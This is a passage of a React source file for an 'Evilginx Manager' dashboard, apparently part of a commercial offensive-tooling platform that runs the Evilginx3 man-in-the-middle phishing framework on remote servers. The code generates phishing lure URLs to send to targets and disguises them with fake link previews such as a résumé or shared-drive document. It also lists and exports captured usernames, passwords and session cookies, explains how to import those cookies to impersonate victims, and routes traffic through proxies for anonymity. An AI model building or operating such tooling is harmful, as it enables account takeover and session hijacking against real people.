          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* URL Dialog */}
      <Dialog open={!!urlDialog} onOpenChange={() => setUrlDialog(null)}>
        <DialogContent className="bg-zinc-900 border-zinc-800">
          <DialogHeader>
            <DialogTitle className="text-white">Phishing URL for Lure #{urlDialog?.id}</DialogTitle>
            <DialogDescription>Send this URL to your target. It contains encrypted parameters.</DialogDescription>
          </DialogHeader>
          <div className="bg-black/50 rounded-lg p-4 break-all">
            <code className="text-emerald-400 text-sm">{urlDialog?.url}</code>
          </div>
          <DialogFooter>
            <Button
              variant="outline"
              className="border-zinc-700"
              onClick={() => {
                navigator.clipboard.writeText(urlDialog?.url || "");
                toast.success("URL copied to clipboard");
              }}
            >
              <Copy className="w-4 h-4 mr-2" /> Copy URL
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Pause Dialog */}
      <Dialog open={!!pauseDialog} onOpenChange={() => setPauseDialog(null)}>
        <DialogContent className="bg-zinc-900 border-zinc-800">
          <DialogHeader>
            <DialogTitle className="text-white">Pause Lure #{pauseDialog?.id}</DialogTitle>
            <DialogDescription>Paused lures redirect visitors to the unauth URL</DialogDescription>
          </DialogHeader>
          <div>
            <Label className="text-zinc-400">Duration (e.g., 1d12h, 5m, 1h30m)</Label>
            <Input
              value={pauseDuration}
              onChange={(e) => setPauseDuration(e.target.value)}
              placeholder="1h"
              className="bg-zinc-800 border-zinc-700 text-white"
            />
          </div>
          <DialogFooter>
            <Button onClick={pauseLure} className="bg-amber-600 hover:bg-amber-700">
              <Pause className="w-4 h-4 mr-2" /> Pause Lure
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* OpenGraph Dialog */}
      <Dialog open={!!ogDialog} onOpenChange={() => setOgDialog(null)}>
        <DialogContent className="bg-zinc-900 border-zinc-800 max-w-lg">
          <DialogHeader>
            <DialogTitle className="text-white flex items-center gap-2">
              <Image className="w-5 h-5 text-blue-400" />
              OpenGraph Preview for Lure #{ogDialog?.id}
            </DialogTitle>
            <DialogDescription>
              Customize how your phishing link appears when shared on social media or messengers
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-4">
            <div>
              <Label className="text-zinc-400">Title (max 60 chars)</Label>
              <Input
                value={ogTitle}
                onChange={(e) => setOgTitle(e.target.value)}
                placeholder="Download RESUME.pdf"
                className="bg-zinc-800 border-zinc-700 text-white"
                maxLength={60}
              />
            </div>
            <div>
              <Label className="text-zinc-400">Description (max 160 chars)</Label>
              <Input
                value={ogDesc}
                onChange={(e) => setOgDesc(e.target.value)}
                placeholder="Download your file securely - click to preview"
                className="bg-zinc-800 border-zinc-700 text-white"
                maxLength={160}
              />
            </div>
            <div>
              <Label className="text-zinc-400">Preview Image URL (1200x630 recommended)</Label>
              <Input
                value={ogImage}
                onChange={(e) => setOgImage(e.target.value)}
                placeholder="https://example.com/preview.jpg"
                className="bg-zinc-800 border-zinc-700 text-white"
              />
            </div>
            <div>
              <Label className="text-zinc-400">Display URL</Label>
              <Input
                value={ogUrl}
                onChange={(e) => setOgUrl(e.target.value)}
                placeholder="https://drive.google.com/shared/document/preview"
                className="bg-zinc-800 border-zinc-700 text-white"
              />
            </div>
            {/* Preview */}
            {(ogTitle || ogDesc) && (
              <div className="bg-zinc-800 rounded-lg border border-zinc-700 overflow-hidden">
                {ogImage && (
                  <div className="h-32 bg-zinc-700 flex items-center justify-center text-zinc-500 text-xs">
                    [Preview Image]
                  </div>
                )}
                <div className="p-3">
                  <p className="text-xs text-zinc-500 uppercase">{ogUrl || "example.com"}</p>
                  <p className="text-sm text-white font-medium">{ogTitle || "Title"}</p>
                  <p className="text-xs text-zinc-400">{ogDesc || "Description"}</p>
                </div>
              </div>
            )}
          </div>
          <DialogFooter>
            <Button onClick={saveOpenGraph} className="bg-red-600 hover:bg-red-700">
              Save OpenGraph
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}

// ─── Sessions Tab ────────────────────────────────────────────────

function SessionsTab({ exec }: { exec: (cmd: string) => Promise<string> }) {
  const [loading, setLoading] = useState(false);
  const [sessions, setSessions] = useState<Session[]>([]);
  const [raw, setRaw] = useState("");
  const [detailDialog, setDetailDialog] = useState<{ id: number; detail: string } | null>(null);
  const [deleteAllConfirm, setDeleteAllConfirm] = useState(false);
  const exportSessions = trpc.evilginx.exportSessions.useMutation();
  const clearSessions = trpc.evilginx.clearSessions.useMutation();
  const getPhishletStats = trpc.evilginx.getPhishletStats.useMutation();
  const [phishletStats, setPhishletStats] = useState<any>(null);

  const loadSessions = useCallback(async () => {
    setLoading(true);
    try {
      const result = await exec("sessions");
      setRaw(result);
      const lines = result.split("\n").filter((l) => l.trim());
      const parsed: Session[] = [];
      for (const line of lines) {
        if (line.includes("---") || line.includes("session") || line.startsWith(":") || line.includes("─")) continue;
        const parts = line.trim().split(/\s{2,}/);
        if (parts.length >= 3) {
          const id = parseInt(parts[0]?.trim());
          if (!isNaN(id)) {
            parsed.push({
              id,
              phishlet: parts[1]?.trim() || "",
              username: parts[2]?.trim() || "",
              password: parts[3]?.trim() || "",
              tokens: (parts[4]?.trim()?.toLowerCase() || "").includes("captured"),
              remoteAddr: parts[5]?.trim() || "",
              createTime: parts[6]?.trim() || "",
            });
          }
        }
      }
      setSessions(parsed);
    } catch (err: any) {
      toast.error(err.message);
    }
    setLoading(false);
  }, [exec]);

  useEffect(() => {
    loadSessions();
  }, [loadSessions]);

  const viewSession = async (id: number) => {
    try {
      const result = await exec(`sessions ${id}`);
      setDetailDialog({ id, detail: result });
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const deleteSession = async (id: number) => {
    try {
      await exec(`sessions delete ${id}`);
      toast.success(`Session ${id} deleted`);
      loadSessions();
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const deleteAllSessions = async () => {
    try {
      await exec("sessions delete all");
      toast.success("All sessions deleted");
      setDeleteAllConfirm(false);
      loadSessions();
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  // Extract cookies JSON from session detail
  const extractCookies = (detail: string): string => {
    const match = detail.match(/\[[\s\S]*?\]/);
    return match ? match[0] : "";
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <div>
          <h3 className="text-white font-semibold">Captured Sessions</h3>
          <p className="text-sm text-zinc-500">View stolen credentials, session cookies, and impersonate captured accounts</p>
        </div>
        <div className="flex gap-2">
          <Button size="sm" variant="ghost" onClick={loadSessions} disabled={loading}>
            <RefreshCw className={`w-4 h-4 ${loading ? "animate-spin" : ""}`} />
          </Button>
          {sessions.length > 0 && (
            <>
              <Button size="sm" variant="outline" className="border-zinc-700 text-zinc-300 text-xs h-7" onClick={() => exportSessions.mutateAsync().then(r => {
                const blob = new Blob([JSON.stringify(r.sessions, null, 2)], { type: "application/json" });
                const url = URL.createObjectURL(blob);
                const a = document.createElement("a"); a.href = url; a.download = "evilginx-sessions.json"; a.click();
                toast.success(`Exported ${r.count} sessions`);
              })} disabled={exportSessions.isPending}>
                <Download className="w-3 h-3 mr-1" /> Export JSON
              </Button>
              <Button size="sm" variant="ghost" onClick={() => setDeleteAllConfirm(true)} className="text-red-400">
                <Trash2 className="w-4 h-4 mr-1" /> Delete All
              </Button>
            </>
          )}
          <Button size="sm" variant="outline" className="border-zinc-700 text-zinc-300 text-xs h-7" onClick={() => getPhishletStats.mutateAsync().then(r => setPhishletStats(r.stats))} disabled={getPhishletStats.isPending}>
            Stats
          </Button>
        </div>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-3 gap-3">
        <Card className="bg-zinc-900/50 border-zinc-800">
          <CardContent className="p-4 text-center">
            <p className="text-2xl font-bold text-white">{sessions.length}</p>
            <p className="text-xs text-zinc-500">Total Sessions</p>
          </CardContent>
        </Card>
        <Card className="bg-emerald-500/5 border-emerald-500/20">
          <CardContent className="p-4 text-center">
            <p className="text-2xl font-bold text-emerald-400">{sessions.filter((s) => s.tokens).length}</p>
            <p className="text-xs text-zinc-500">Tokens Captured</p>
          </CardContent>
        </Card>
        <Card className="bg-blue-500/5 border-blue-500/20">
          <CardContent className="p-4 text-center">
            <p className="text-2xl font-bold text-blue-400">{sessions.filter((s) => s.username).length}</p>
            <p className="text-xs text-zinc-500">With Credentials</p>
          </CardContent>
        </Card>
      </div>

      {/* Session Cards */}
      <div className="space-y-2">
        {sessions.length === 0 && !loading && (
          <div className="text-center py-12 text-zinc-500">
            <Users className="w-12 h-12 mx-auto mb-3 opacity-30" />
            <p>No captured sessions yet. Phishing links need to be clicked first.</p>
          </div>
        )}
        {sessions.map((s) => (
          <Card key={s.id} className="bg-zinc-900/50 border-zinc-800 hover:border-zinc-700 transition-colors">
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div
                    className={`rounded-lg p-2 ${
                      s.tokens ? "bg-emerald-500/10" : "bg-zinc-800"
                    }`}
                  >
                    <Cookie className={`w-4 h-4 ${s.tokens ? "text-emerald-400" : "text-zinc-500"}`} />
                  </div>
                  <div>
                    <div className="flex items-center gap-2">
                      <p className="text-white font-medium">Session #{s.id}</p>
                      <Badge className="bg-zinc-800 text-zinc-300 border-zinc-700 text-xs">{s.phishlet}</Badge>
                      {s.tokens && (
                        <Badge className="bg-emerald-500/20 text-emerald-400 border-emerald-500/30 text-xs">
                          Tokens Captured
                        </Badge>
                      )}
                    </div>
                    <div className="flex items-center gap-4 text-xs text-zinc-500 mt-1">
                      {s.username && (
                        <span className="flex items-center gap-1">
                          <Users className="w-3 h-3" /> {s.username}
                        </span>
                      )}
                      {s.remoteAddr && (
                        <span className="flex items-center gap-1">
                          <Network className="w-3 h-3" /> {s.remoteAddr}
                        </span>
                      )}
                      {s.createTime && <span>{s.createTime}</span>}
                    </div>
                  </div>
                </div>
                <div className="flex items-center gap-1">
                  <Button size="sm" variant="ghost" onClick={() => viewSession(s.id)} className="text-blue-400 hover:text-blue-300">
                    <Eye className="w-3 h-3 mr-1" /> View Details
                  </Button>
                  <Button size="sm" variant="ghost" onClick={() => deleteSession(s.id)} className="text-red-400 hover:text-red-300">
                    <Trash2 className="w-3 h-3" />
                  </Button>
                </div>
              </div>
            </CardContent>
          </Card>
        ))}
      </div>

      {/* Session Detail Dialog */}
      <Dialog open={!!detailDialog} onOpenChange={() => setDetailDialog(null)}>
        <DialogContent className="bg-zinc-900 border-zinc-800 max-w-2xl max-h-[80vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle className="text-white">Session #{detailDialog?.id} Details</DialogTitle>
            <DialogDescription>Captured credentials, session cookies, and authentication tokens</DialogDescription>
          </DialogHeader>
          <pre className="bg-black/50 rounded-lg p-4 text-sm text-zinc-300 font-mono whitespace-pre-wrap overflow-x-auto">
            {detailDialog?.detail}
          </pre>
          {detailDialog?.detail && extractCookies(detailDialog.detail) && (
            <div className="space-y-2">
              <p className="text-sm text-zinc-400 font-medium">Session Cookies (for impersonation):</p>
              <div className="bg-emerald-500/5 border border-emerald-500/20 rounded-lg p-3">
                <p className="text-xs text-zinc-500 mb-2">
                  Import these cookies using EditThisCookie or Cookie-Editor extension.
                  Clear all cookies first, then import and visit the target site.
                </p>
                <Button
                  size="sm"
                  variant="outline"
                  className="border-emerald-500/30 text-emerald-400"
                  onClick={() => {
                    navigator.clipboard.writeText(extractCookies(detailDialog.detail));
                    toast.success("Cookies copied to clipboard");
                  }}
                >
                  <Cookie className="w-3 h-3 mr-1" /> Copy Cookies JSON
                </Button>
              </div>
            </div>
          )}
          <DialogFooter>
            <Button
              variant="outline"
              className="border-zinc-700"
              onClick={() => {
                navigator.clipboard.writeText(detailDialog?.detail || "");
                toast.success("Full session details copied");
              }}
            >
              <Copy className="w-4 h-4 mr-2" /> Copy All
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Delete All Confirm */}
      <Dialog open={deleteAllConfirm} onOpenChange={setDeleteAllConfirm}>
        <DialogContent className="bg-zinc-900 border-zinc-800">
          <DialogHeader>
            <DialogTitle className="text-white">Delete All Sessions?</DialogTitle>
            <DialogDescription>
              This will permanently delete all {sessions.length} captured sessions including credentials and cookies.
              This action cannot be undone.
            </DialogDescription>
          </DialogHeader>
          <DialogFooter>
            <Button variant="outline" className="border-zinc-700" onClick={() => setDeleteAllConfirm(false)}>
              Cancel
            </Button>
            <Button onClick={deleteAllSessions} className="bg-red-600 hover:bg-red-700">
              Delete All Sessions
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}

// ─── Proxy & Blacklist Tab ───────────────────────────────────────

function ProxyBlacklistTab({ exec }: { exec: (cmd: string) => Promise<string> }) {
  const [proxyConfig, setProxyConfig] = useState("");
  const [blacklistConfig, setBlacklistConfig] = useState("");
  const [loading, setLoading] = useState(false);
  // Proxy form
  const [proxyType, setProxyType] = useState("http");
  const [proxyAddr, setProxyAddr] = useState("");
  const [proxyPort, setProxyPort] = useState("");
  const [proxyUser, setProxyUser] = useState("");
  const [proxyPass, setProxyPass] = useState("");
  const [proxyEnabled, setProxyEnabled] = useState(false);
  // Blacklist
  const [blacklistMode, setBlacklistMode] = useState("off");

  const loadAll = useCallback(async () => {
    setLoading(true);
    try {
      const [proxy, blacklist] = await Promise.all([exec("proxy"), exec("blacklist")]);
      setProxyConfig(proxy);
      setBlacklistConfig(blacklist);
    } catch (err: any) {
      toast.error(err.message);
    }
    setLoading(false);
  }, [exec]);

  useEffect(() => {
    loadAll();
  }, [loadAll]);

  const saveProxy = async () => {
    setLoading(true);
    try {
      const cmds: string[] = [];
      if (proxyType) cmds.push(`proxy type ${proxyType}`);
      if (proxyAddr) cmds.push(`proxy address ${proxyAddr}`);
      if (proxyPort) cmds.push(`proxy port ${proxyPort}`);
      if (proxyUser) cmds.push(`proxy username ${proxyUser}`);
      if (proxyPass) cmds.push(`proxy password ${proxyPass}`);
      cmds.push(`proxy enabled ${proxyEnabled}`);
      for (const cmd of cmds) {
        await exec(cmd);
      }
      toast.success("Proxy configuration saved");
      loadAll();
    } catch (err: any) {
      toast.error(err.message);
    }
    setLoading(false);
  };

  const saveBlacklist = async () => {
    try {
      await exec(`blacklist ${blacklistMode}`);
      toast.success(`Blacklist mode set to: ${blacklistMode}`);
      loadAll();
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  return (
    <div className="space-y-6">
      {/* Proxy */}
      <Card className="bg-zinc-900/50 border-zinc-800">
        <CardHeader className="pb-3">
          <div className="flex items-center justify-between">
            <CardTitle className="text-white text-lg flex items-center gap-2">
              <Network className="w-5 h-5 text-purple-400" />
              Upstream Proxy
            </CardTitle>
            <Button size="sm" variant="ghost" onClick={loadAll} disabled={loading}>
              <RefreshCw className={`w-4 h-4 ${loading ? "animate-spin" : ""}`} />
            </Button>
          </div>
          <CardDescription>Route Evilginx traffic through an upstream proxy for anonymity</CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <pre className="bg-black/50 rounded-lg p-3 text-xs text-zinc-400 font-mono">{proxyConfig || "Loading..."}</pre>
          <div className="grid grid-cols-2 gap-4">
            <div>
              <Label className="text-zinc-400">Type</Label>
              <Select value={proxyType} onValueChange={setProxyType}>
                <SelectTrigger className="bg-zinc-800 border-zinc-700 text-white">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent className="bg-zinc-800 border-zinc-700">
                  <SelectItem value="http">HTTP</SelectItem>
                  <SelectItem value="socks5">SOCKS5</SelectItem>
                </SelectContent>
              </Select>
            </div>
            <div>
              <Label className="text-zinc-400">Address</Label>
              <Input value={proxyAddr} onChange={(e) => setProxyAddr(e.target.value)} placeholder="127.0.0.1" className="bg-zinc-800 border-zinc-700 text-white" />
            </div>
            <div>
              <Label className="text-zinc-400">Port</Label>
              <Input value={proxyPort} onChange={(e) => setProxyPort(e.target.value)} placeholder="8080" className="bg-zinc-800 border-zinc-700 text-white" />
            </div>
            <div>
              <Label className="text-zinc-400">Username (optional)</Label>
              <Input value={proxyUser} onChange={(e) => setProxyUser(e.target.value)} placeholder="user" className="bg-zinc-800 border-zinc-700 text-white" />
            </div>
            <div>
              <Label className="text-zinc-400">Password (optional)</Label>
              <Input type="password" value={proxyPass} onChange={(e) => setProxyPass(e.target.value)} placeholder="pass" className="bg-zinc-800 border-zinc-700 text-white" />
            </div>
            <div className="flex items-end">
              <label className="flex items-center gap-2 text-sm text-zinc-400 cursor-pointer pb-2">
                <input type="checkbox" checked={proxyEnabled} onChange={(e) => setProxyEnabled(e.target.checked)} className="rounded border-zinc-600" />
                Enable Proxy
              </label>
            </div>
          </div>
          <Button onClick={saveProxy} className="bg-purple-600 hover:bg-purple-700" disabled={loading}>
            Save Proxy Settings
          </Button>
        </CardContent>
      </Card>

      {/* Blacklist */}
      <Card className="bg-zinc-900/50 border-zinc-800">
        <CardHeader className="pb-3">
          <CardTitle className="text-white text-lg flex items-center gap-2">
            <ShieldAlert className="w-5 h-5 text-amber-400" />
            Blacklist
          </CardTitle>
          <CardDescription>Automatically blacklist IPs that trigger detection or unauthorized access</CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <pre className="bg-black/50 rounded-lg p-3 text-xs text-zinc-400 font-mono">{blacklistConfig || "Loading..."}</pre>
          <div>
            <Label className="text-zinc-400">Blacklist Mode</Label>
            <Select value={blacklistMode} onValueChange={setBlacklistMode}>
              <SelectTrigger className="bg-zinc-800 border-zinc-700 text-white w-64">
                <SelectValue />
              </SelectTrigger>
              <SelectContent className="bg-zinc-800 border-zinc-700">
                <SelectItem value="off">Off (no blacklisting)</SelectItem>
                <SelectItem value="unauth">Unauth (blacklist unauthorized visitors)</SelectItem>
                <SelectItem value="all">All (blacklist all non-lure visitors)</SelectItem>
              </SelectContent>
            </Select>
          </div>
          <Button onClick={saveBlacklist} className="bg-amber-600 hover:bg-amber-700">
            Save Blacklist Mode
          </Button>
        </CardContent>
      </Card>
    </div>
  );
}

// ─── Terminal Tab ────────────────────────────────────────────────

function TerminalTab({ exec: _exec }: { exec: (cmd: string) => Promise<string> }) {
  const [command, setCommand] = useState("");
  const { lines, isStreaming, exitCode, error, run, cancel, clear } = useSecurityStream("evilginx");
  const inputRef = useRef<HTMLInputElement>(null);

  const runCommand = () => {
    if (!command.trim() || isStreaming) return;
    const cmd = command.trim();
    setCommand("");
    run(cmd);
  };

  return (
    <div className="space-y-4">
      <div>
        <h3 className="text-white font-semibold flex items-center gap-2">
          <Terminal className="w-5 h-5 text-emerald-400" />
          Evilginx Terminal
        </h3>
        <p className="text-sm text-zinc-500">Real-time SSH command streaming — output appears line-by-line as it executes</p>
      </div>

      {/* Streaming Terminal */}
      <StreamingTerminal
        lines={lines}
        isStreaming={isStreaming}
        exitCode={exitCode}
        error={error}
        onClear={clear}
        onCancel={cancel}
        className="min-h-[400px]"
      />

      {/* Input */}
      <div className="flex gap-2">
        <div className="flex-1 flex items-center bg-black rounded-lg border border-zinc-800 px-3">
          <span className="text-red-400 font-mono mr-2">:</span>
          <input
            ref={inputRef}
            value={command}
            onChange={(e) => setCommand(e.target.value)}
            onKeyDown={(e) => e.key === "Enter" && runCommand()}
            placeholder="Type an Evilginx command..."
            className="flex-1 bg-transparent text-white font-mono text-sm py-3 outline-none placeholder:text-zinc-600"
            disabled={isStreaming}
          />
        </div>
        <Button onClick={runCommand} className="bg-red-600 hover:bg-red-700" disabled={isStreaming || !command.trim()}>
          {isStreaming ? <Loader2 className="w-4 h-4 animate-spin" /> : <Play className="w-4 h-4" />}
        </Button>
      </div>

      {/* Quick Commands */}
      <div className="flex flex-wrap gap-2">
        {["help", "config", "phishlets", "lures", "sessions", "proxy", "blacklist"].map((cmd) => (
          <Button
            key={cmd}
            size="sm"
            variant="outline"
            className="border-zinc-800 text-zinc-400 hover:text-white font-mono text-xs"
            onClick={() => { run(cmd); }}
            disabled={isStreaming}
          >
            {cmd}
          </Button>
        ))}
      </div>
    </div>
  );
}

// ─── Main Page ───────────────────────────────────────────────────

export default function EvilginxPage() {
  const { canUse, loading: subLoading } = useSubscription();
  const [connected, setConnected] = useState(false);
  const [connectionConfig, setConnectionConfig] = useState<ConnectionConfig | null>(null);
  const [showSetup, setShowSetup] = useState(false);
  const [activeTab, setActiveTab] = useState("config");

    const getConnectionQuery = trpc.evilginx.getConnection.useQuery(undefined, {
    enabled: canUse("offensive_tooling"),
    retry: false,
  });
  const execMutation = trpc.evilginx.exec.useMutation();
  // Node management hooks for VpsNodeManager
  const listNodesQuery = trpc.evilginx.listNodes.useQuery(undefined, { enabled: canUse("offensive_tooling") });
  const addNodeMutation = trpc.evilginx.addNode.useMutation();
  const deployNodeMutation = trpc.evilginx.deployNode.useMutation();
  const checkNodeMutation = trpc.evilginx.checkNode.useMutation();
  const setActiveNodeMutation = trpc.evilginx.setActiveNode.useMutation();
  const removeNodeMutation = trpc.evilginx.removeNode.useMutation();
  useEffect(() => {
    if (getConnectionQuery.data) {
      setConnectionConfig(getConnectionQuery.data);
      setConnected(!!getConnectionQuery.data.connected);
    }
  }, [getConnectionQuery.data]);

  const execCommand = useCallback(
    async (command: string): Promise<string> => {
      try {
        const result = await execMutation.mutateAsync({ command });
        return result.output;
      } catch (err: any) {
        // Return the error message as output so tabs can display it inline
        // rather than letting it bubble up as a generic "internal error" toast.
        const msg: string = err?.message ?? err?.data?.message ?? String(err);
        return `[SSH Error] ${msg}`;
      }
    },
    [execMutation]
  );

  // Gate check
  if (subLoading) {
    return (
      <div className="flex items-center justify-center min-h-[70vh]">
        <Loader2 className="w-8 h-8 animate-spin text-zinc-500" />
      </div>
    );
  }

  if (!canUse("offensive_tooling")) {
    return <TitanGate />;
  }

  return (
    <div className="max-w-6xl mx-auto p-6 space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-4">
          <div className="bg-red-500/10 rounded-xl p-3">
            <Shield className="w-8 h-8 text-red-400" />
          </div>
          <div>
            <h1 className="text-2xl font-bold text-white flex items-center gap-2">
              Evilginx Manager
              <Badge className="bg-red-500/20 text-red-400 border-red-500/30 text-xs">v3.3</Badge>
              <Badge className="bg-amber-500/20 text-amber-400 border-amber-500/30 text-xs">Titan</Badge>
            </h1>
            <p className="text-zinc-500">
              Manage Evilginx3 running on the Titan server — phishlets, lures, sessions &amp; more
            </p>
          </div>
        </div>
        <div className="flex items-center gap-3">
          {connected ? (
            <div className="flex items-center gap-2">
              <Badge className="bg-emerald-500/20 text-emerald-400 border-emerald-500/30">
                <Wifi className="w-3 h-3 mr-1" />
                {connectionConfig?.isLocal ? "localhost (this server)" : `${connectionConfig?.host}:${connectionConfig?.port}`}
              </Badge>
              <Button size="sm" variant="outline" className="border-zinc-700" onClick={() => setShowSetup(true)}>
                <Settings className="w-4 h-4" />
              </Button>
            </div>
          ) : (
            <Button onClick={() => setShowSetup(true)} className="bg-red-600 hover:bg-red-700">
              <Zap className="w-4 h-4 mr-2" /> Connect Evilginx3
            </Button>
          )}
        </div>
      </div>

      {/* Not Connected State */}
      {!connected && (
        <Card className="bg-zinc-900/50 border-zinc-800">
          <CardContent className="p-12 text-center">
            <WifiOff className="w-16 h-16 text-zinc-600 mx-auto mb-4" />
            <h2 className="text-xl font-semibold text-white mb-2">No Evilginx3 Node Connected</h2>
            <p className="text-zinc-500 max-w-md mx-auto mb-6">
              Evilginx3 requires a dedicated VPS with its own public IP for MITM phishing.
              Add a node and Titan will install Evilginx3 on it automatically via SSH.
            </p>
            <div className="space-y-3 text-left max-w-sm mx-auto mb-6">
              {["Get a fresh VPS from any provider (Vultr, Hetzner, DigitalOcean…)",
                "Click Add VPS Node and enter the SSH credentials",
                "Click Deploy — Titan installs Evilginx3 automatically",
                "Manage phishlets, lures and sessions from this dashboard"].map((step, i) => (
                <div key={i} className="flex items-start gap-3 text-sm">
                  <div className="bg-red-500/10 rounded-full p-1 mt-0.5 flex-shrink-0">
                    <span className="text-red-400 text-xs font-bold w-4 h-4 flex items-center justify-center">{i + 1}</span>
                  </div>
                  <p className="text-zinc-400">{step}</p>
                </div>
              ))}
            </div>
            <Button onClick={() => setShowSetup(true)} className="bg-red-600 hover:bg-red-700">
              <Server className="w-4 h-4 mr-2" /> Add VPS Node
            </Button>
          </CardContent>
        </Card>
      )}

      {/* Main Dashboard */}
      {connected && (
        <Tabs value={activeTab} onValueChange={setActiveTab}>
          <TabsList className="bg-zinc-900 border border-zinc-800 p-1">
            <TabsTrigger value="config" className="data-[state=active]:bg-zinc-800 data-[state=active]:text-white">
              <Settings className="w-4 h-4 mr-2" /> Config
            </TabsTrigger>
            <TabsTrigger value="phishlets" className="data-[state=active]:bg-zinc-800 data-[state=active]:text-white">
              <Shield className="w-4 h-4 mr-2" /> Phishlets
            </TabsTrigger>
            <TabsTrigger value="lures" className="data-[state=active]:bg-zinc-800 data-[state=active]:text-white">
              <Link2 className="w-4 h-4 mr-2" /> Lures
            </TabsTrigger>
            <TabsTrigger value="sessions" className="data-[state=active]:bg-zinc-800 data-[state=active]:text-white">
              <Users className="w-4 h-4 mr-2" /> Sessions
            </TabsTrigger>
            <TabsTrigger value="proxy" className="data-[state=active]:bg-zinc-800 data-[state=active]:text-white">
              <Network className="w-4 h-4 mr-2" /> Proxy & Blacklist
            </TabsTrigger>
            <TabsTrigger value="terminal" className="data-[state=active]:bg-zinc-800 data-[state=active]:text-white">
              <Terminal className="w-4 h-4 mr-2" /> Terminal
            </TabsTrigger>
          </TabsList>

          <TabsContent value="config" className="mt-6">
            <ConfigTab exec={execCommand} />
          </TabsContent>
          <TabsContent value="phishlets" className="mt-6">
            <PhishletsTab exec={execCommand} />
          </TabsContent>
          <TabsContent value="lures" className="mt-6">
            <LuresTab exec={execCommand} />
          </TabsContent>
          <TabsContent value="sessions" className="mt-6">
            <SessionsTab exec={execCommand} />
          </TabsContent>
          <TabsContent value="proxy" className="mt-6">
            <ProxyBlacklistTab exec={execCommand} />
          </TabsContent>
          <TabsContent value="terminal" className="mt-6">
            <TerminalTab exec={execCommand} />
          </TabsContent>
        </Tabs>
      )}

      {/* VPS Node Manager Dialog */}
      <VpsNodeManager
        open={showSetup}
        onClose={() => {
          setShowSetup(false);
          getConnectionQuery.refetch();
          listNodesQuery.refetch();
        }}
        toolName="Evilginx3"
        accentColor="red"
        deployLabel="Deploy Evilginx3"
        hooks={{
          listNodes: listNodesQuery,
          addNode: addNodeMutation,
          deployNode: deployNodeMutation,
          checkNode: checkNodeMutation,
          setActiveNode: setActiveNodeMutation,
          removeNode: removeNodeMutation,
        }}
      />
    </div>
  );
}
